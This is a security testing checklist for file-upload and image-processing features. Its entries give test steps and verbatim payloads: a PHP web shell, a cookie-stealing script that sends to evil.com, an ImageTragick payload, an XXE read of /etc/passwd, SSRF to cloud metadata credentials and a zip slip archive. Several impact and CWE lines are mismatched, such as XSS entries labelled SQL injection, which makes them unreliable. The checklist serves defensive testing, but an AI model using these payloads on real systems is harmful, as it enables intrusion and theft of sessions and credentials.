# 3. File & Media Management — Checklist

Feature-area security **test cases** for “3. File & Media Management”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*145 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## FILE-001 — Unrestricted Web Shell Upload
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Intercept file upload request 2. Change file content to web shell code 3. Set filename to shell.php 4. Submit upload 5. Access uploaded file URL directly

**Expected Result:** Application must reject executable file types and never execute uploaded content

**Payload Example:**

```
<?php system($_GET['cmd']); ?> saved as shell.php
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / OWASP ZAP / Weevely

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-002 — Double Extension Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Rename malicious file to shell.php.jpg 2. Upload the file 3. Check if server processes it as PHP 4. Try shell.php%00.jpg with null byte 5. Attempt shell.pHp mixed case

**Expected Result:** Application must validate against double extensions and normalize file names

**Payload Example:**

```
shell.php.jpg or shell.php%00.jpg or shell.pHp
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / cURL / Intruder

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-003 — MIME Type Manipulation
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create a PHP web shell 2. Intercept the upload request 3. Change Content-Type header to image/jpeg 4. Forward the request 5. Check if file is accepted and executable

**Expected Result:** Application must validate file content via magic bytes not just Content-Type header

**Payload Example:**

```
Content-Type: image/jpeg with body containing <?php system($_GET['c']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-004 — Null Byte Injection in Filename
**Test Category:** WSTG-INPV-03 / Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Intercept upload request 2. Set filename to malicious.php%00.png 3. Submit request 4. Check stored filename on server 5. Attempt to access file as .php

**Expected Result:** Application must sanitize null bytes from filenames and reject such uploads

**Payload Example:**

```
filename="shell.php%00.png" or filename="shell.php\x00.png"
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Hex Editor

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-005 — Path Traversal in Filename
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Intercept upload request 2. Change filename to ../../../etc/cron.d/malicious 3. Try ....// and ..%2f..%2f variations 4. Submit and verify file storage location

**Expected Result:** Application must strip or reject path traversal sequences from filenames

**Payload Example:**

```
filename="../../../../tmp/shell.php" or filename="..%2f..%2fshell.php"
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / cURL / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-006 — SVG File XSS Injection
**Test Category:** WSTG-INPV-02 / XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create SVG file with embedded JavaScript 2. Upload SVG file 3. Access the uploaded SVG URL 4. Check if JavaScript executes in browser context

**Expected Result:** Application must sanitize SVG files or serve them with Content-Disposition attachment header

**Payload Example:**

```
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-007 — HTML File Upload XSS
**Test Category:** WSTG-INPV-02 / XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create HTML file with malicious JavaScript 2. Upload as .html or .htm 3. Access uploaded file URL 4. Verify if script executes in application domain

**Expected Result:** Application must not serve HTML files inline from same origin or must sanitize them

**Payload Example:**

```
<html><body><script>fetch('https://evil.com/steal?c='+document.cookie)</script></body></html>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-008 — Polyglot File Upload
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create a file that is valid JPEG and contains PHP code 2. Use exiftool to embed PHP in JPEG comment 3. Upload the polyglot file 4. Try to access and execute

**Expected Result:** Application must not execute uploaded files regardless of content

**Payload Example:**

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg && mv image.jpg image.php.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** ExifTool / Burp Suite / Gimp

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-009 — Oversized File Upload DoS
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Generate extremely large file (10GB+) 2. Attempt to upload the file 3. Monitor server resource consumption 4. Send multiple concurrent large uploads 5. Check if server becomes unresponsive

**Expected Result:** Application must enforce maximum file size limits on both client and server side

**Payload Example:**

```
dd if=/dev/zero of=largefile.bin bs=1M count=10240
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** cURL / Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-010 — Race Condition File Upload
**Test Category:** WSTG-BUSL-09 / Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload a malicious file 2. Immediately send request to access the file before validation completes 3. Use turbo intruder for parallel requests 4. Check if file is accessible during processing window

**Expected Result:** Application must validate files before making them accessible and use atomic operations

**Payload Example:**

```
Upload shell.php and simultaneously GET /uploads/shell.php in tight loop
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FILE-011 — EXIF Metadata Injection
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Add XSS payload to image EXIF data fields 2. Upload the modified image 3. View image details/metadata page 4. Check if EXIF data is rendered without sanitization

**Expected Result:** Application must sanitize or strip EXIF metadata before displaying to users

**Payload Example:**

```
exiftool -Artist='<script>alert(1)</script>' image.jpg
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** ExifTool / Burp Suite / jhead

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-012 — File Overwrite via Duplicate Names
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload a legitimate file named config.jpg 2. Upload another file with same name containing malicious content 3. Check if original is overwritten 4. Try overwriting system files

**Expected Result:** Application must implement unique naming or versioning to prevent overwrites

**Payload Example:**

```
Upload benign.jpg then upload malicious shell as benign.jpg to same path
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL

**References:** CWE-840; PortSwigger Business logic

---

## FILE-013 — Content Sniffing Attack
**Test Category:** WSTG-INPV-02 / MIME Sniffing · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload file with mismatched extension and content 2. Check response headers for X-Content-Type-Options 3. Verify Content-Type in response 4. Test if browser sniffs content as HTML/JS

**Expected Result:** Application must set X-Content-Type-Options: nosniff and correct Content-Type headers

**Payload Example:**

```
Upload HTML content as file.jpg and check if browser renders HTML
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## FILE-014 — Server-Side Request Forgery via File URL
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. If application accepts URL for file upload 2. Provide internal network URL (http://169.254.169.254/latest/meta-data/) 3. Provide localhost URLs 4. Check response for internal data

**Expected Result:** Application must validate and restrict URLs to prevent SSRF attacks

**Payload Example:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ or http://127.0.0.1:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap / cURL

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-015 — XML-Based File XXE Injection
**Test Category:** WSTG-INPV-07 / XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create DOCX/XLSX/SVG file with XXE payload 2. Modify internal XML files in the archive 3. Upload the crafted file 4. Check if external entity is resolved

**Expected Result:** Application must disable external entity processing in all XML parsers

**Payload Example:**

```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector / Custom XML

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FILE-016 — Upload Directory Listing Exposure
**Test Category:** WSTG-CONF-04 / Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Navigate to the upload directory URL 2. Check if directory listing is enabled 3. Try common upload paths (/uploads/ /files/ /media/) 4. Enumerate uploaded files

**Expected Result:** Application must disable directory listing on upload directories

**Payload Example:**

```
GET /uploads/ or GET /media/ or GET /files/ and check for directory index
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** DirBuster / Gobuster / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-017 — Malicious PDF Upload
**Test Category:** WSTG-INPV-02 / File Upload · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create PDF with embedded JavaScript 2. Upload the malicious PDF 3. Open PDF through application preview 4. Check if JavaScript executes

**Expected Result:** Application must sanitize PDFs or use safe PDF viewers that block script execution

**Payload Example:**

```
PDF with /OpenAction /JS (app.alert(1)) embedded JavaScript action
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / PDFStreamDumper / Camelot

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-018 — File Upload IDOR
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload file as User A 2. Note the file ID or reference 3. Login as User B 4. Try to access or modify User A file using the reference

**Expected Result:** Application must enforce authorization checks on all file operations

**Payload Example:**

```
GET /api/files/12345 while authenticated as different user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-019 — Zip Slip via Archive Upload
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create zip file with path traversal in entry names 2. Include entry like ../../../tmp/evil.sh 3. Upload the archive 4. Check if files are extracted outside target directory

**Expected Result:** Application must validate and sanitize zip entry names before extraction

**Payload Example:**

```
zip containing entry ../../../../tmp/evil.sh using python zipfile module
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Custom Python Script / evilarc / Zip-Slip-Exploit

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-020 — Decompression Bomb Upload
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create a zip bomb (42.zip or nested compression) 2. Upload the archive 3. Monitor server resources during extraction 4. Check if server runs out of disk/memory

**Expected Result:** Application must limit decompression ratio and extracted file sizes

**Payload Example:**

```
42.zip (42KB compressed / 4.5PB uncompressed) or nested zip bomb
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Scripts / zip bomb generators

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-021 — Executable File Masquerading
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Rename .exe/.bat/.sh to allowed extension 2. Use alternate executable extensions (.phtml .php5 .shtml .asa) 3. Upload and check if executed 4. Try .htaccess upload

**Expected Result:** Application must validate file type by content analysis not just extension

**Payload Example:**

```
.phtml .php5 .php7 .phps .pht .shtml .asa .cer .asax .swf .xap .htaccess
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Intruder / SecLists

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-022 — Concurrent Upload Race Condition
**Test Category:** WSTG-BUSL-09 / Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Send 100+ simultaneous upload requests 2. Use same filename in all requests 3. Check for file corruption or partial writes 4. Verify quota enforcement under concurrency

**Expected Result:** Application must handle concurrent uploads atomically and enforce limits consistently

**Payload Example:**

```
Turbo Intruder script sending 100 parallel upload requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite Turbo Intruder / Apache JMeter / GNU Parallel

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FILE-023 — Upload Parameter Pollution
**Test Category:** WSTG-INPV-04 / Parameter Pollution · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Send multiple filename parameters in single request 2. Send multiple file fields with different content 3. Check which file is processed 4. Try to bypass validation via parameter priority

**Expected Result:** Application must handle multiple parameters consistently and validate all

**Payload Example:**

```
filename="safe.jpg"&filename="shell.php" or multiple file fields in multipart
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / cURL

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## FILE-024 — Stored XSS via Filename
**Test Category:** WSTG-INPV-02 / Stored XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Set filename to XSS payload 2. Upload the file 3. Navigate to file listing page 4. Check if filename is rendered without encoding

**Expected Result:** Application must HTML-encode filenames when displaying in UI

**Payload Example:**

```
filename="<img src=x onerror=alert(document.cookie)>.jpg"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-025 — Client-Side Validation Bypass on Drop
**Test Category:** WSTG-CLNT-01 / Client-Side Controls · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Identify client-side file type checks on drag-drop handler 2. Intercept request after drop event 3. Replace file content with malicious payload 4. Forward modified request

**Expected Result:** Application must implement server-side validation regardless of client-side checks

**Payload Example:**

```
Drop image then intercept and replace body with PHP shell content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## FILE-026 — Event Handler Injection via Drop
**Test Category:** WSTG-INPV-02 / XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Analyze drag-drop JavaScript handlers 2. Craft HTML page that auto-drops malicious content 3. Test if drop zone processes embedded HTML/JS in file metadata 4. Check for DOM XSS

**Expected Result:** Application must sanitize all data from drop events and not execute embedded scripts

**Payload Example:**

```
Craft page with ondrop handler injecting <script>alert(1)</script> in filename metadata
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools / DOM Invader

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-027 — Multi-File Drop Bomb
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Select thousands of files 2. Drop all files simultaneously 3. Monitor browser and server resource usage 4. Check if application queues or crashes

**Expected Result:** Application must limit concurrent uploads and implement proper queuing

**Payload Example:**

```
Drop 10000+ small files simultaneously on upload zone
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Script / Browser DevTools / JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-028 — Directory Drop Path Disclosure
**Test Category:** WSTG-INFO-05 / Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Drop an entire folder via drag-drop 2. Check if full local file paths are sent to server 3. Inspect request for relative path information 4. Look for OS information leakage

**Expected Result:** Application must strip local path information from uploaded directory structures

**Payload Example:**

```
Drop folder and check if webkitRelativePath or full paths leak in request
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-029 — Drop Zone Clickjacking
**Test Category:** WSTG-CLNT-09 / Clickjacking · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Create malicious page that iframes the upload page 2. Overlay transparent drop zone over attacker content 3. Trick user into dropping sensitive files 4. Check if X-Frame-Options prevents framing

**Expected Result:** Application must set X-Frame-Options DENY and CSP frame-ancestors none

**Payload Example:**

```
<iframe src="https://target.com/upload" style="opacity:0;position:absolute"></iframe>
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite / Custom HTML Page

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## FILE-030 — ImageMagick Remote Code Execution
**Test Category:** CVE-2016-3714 / ImageTragick · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create malicious MVG/SVG file exploiting ImageMagick delegates 2. Upload as image for cropping 3. Monitor for command execution 4. Try various ImageMagick CVE payloads

**Expected Result:** Application must use policy.xml to restrict ImageMagick delegates and update to patched versions

**Payload Example:**

```
push graphic-context viewbox 0 0 640 480 fill 'url(https://evil.com/image.jpg"|ls "-la)' pop graphic-context
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** ImageMagick / Burp Suite / IMT (ImageMagick Toolkit)

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## FILE-031 — Pixel Flood Attack
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create image with extremely large dimensions but small file size (e.g. 65535x65535 PNG) 2. Upload for processing 3. Monitor server memory usage 4. Check if server crashes

**Expected Result:** Application must validate image dimensions before processing and set maximum limits

**Payload Example:**

```
Convert -size 65535x65535 xc:red pixel_flood.png or crafted PNG header with huge dimensions
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** ImageMagick / Custom Script / GIMP

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FILE-032 — SSRF via Image Processing
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create SVG/MVG with external URL references 2. Upload for image processing 3. Reference internal network resources 4. Check if server fetches internal URLs

**Expected Result:** Application must sanitize image files and block external resource loading during processing

**Payload Example:**

```
<svg><image href="http://169.254.169.254/latest/meta-data/" /></svg>
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / Collaborator / SVG crafting tools

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-033 — Image Processing Memory Exhaustion
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create image with many layers or excessive color depth 2. Upload for cropping/resizing 3. Request extreme resize dimensions 4. Monitor server memory and CPU

**Expected Result:** Application must limit processing resources and set timeouts for image operations

**Payload Example:**

```
Upload 100-layer TIFF or request resize to 99999x99999
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** GIMP / ImageMagick / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-034 — Malicious ICC Profile Injection
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Embed malicious data in image ICC color profile 2. Upload image for processing 3. Check if ICC profile data is parsed unsafely 4. Monitor for crashes or information disclosure

**Expected Result:** Application must validate ICC profiles or strip them during processing

**Payload Example:**

```
exiftool -icc_profile<=malicious_profile.icc image.jpg
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** ExifTool / Custom ICC profile generator

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-035 — GhostScript RCE via Image Processing
**Test Category:** CVE-2023-36664 / RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create malicious EPS/PS/PDF file 2. Rename to image extension 3. Upload for processing by GhostScript backend 4. Monitor for command execution

**Expected Result:** Application must restrict GhostScript processing and use -dSAFER flag

**Payload Example:**

```
%!PS userdict /setpagedevice undef (command) (r) file
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** GhostScript / Burp Suite / Custom PostScript

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## FILE-036 — Image Crop Coordinate Injection
**Test Category:** WSTG-INPV-01 / Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Intercept crop request 2. Modify x/y/width/height to negative or extreme values 3. Set coordinates beyond image boundaries 4. Insert non-numeric values

**Expected Result:** Application must validate crop coordinates are within bounds and are valid integers

**Payload Example:**

```
x=-1&y=-1&width=999999&height=999999 or x=0;ls -la&y=0
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / cURL

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FILE-037 — EXIF GPS Data Leakage
**Test Category:** WSTG-INFO-05 / Privacy · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Upload image with GPS EXIF data 2. Download processed image 3. Check if EXIF data is preserved after cropping 4. Verify if GPS coordinates are accessible to other users

**Expected Result:** Application must strip sensitive EXIF metadata (GPS location) during processing

**Payload Example:**

```
Upload phone photo with GPS coordinates and check processed output for EXIF data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** ExifTool / Jeffrey EXIF Viewer / Burp Suite

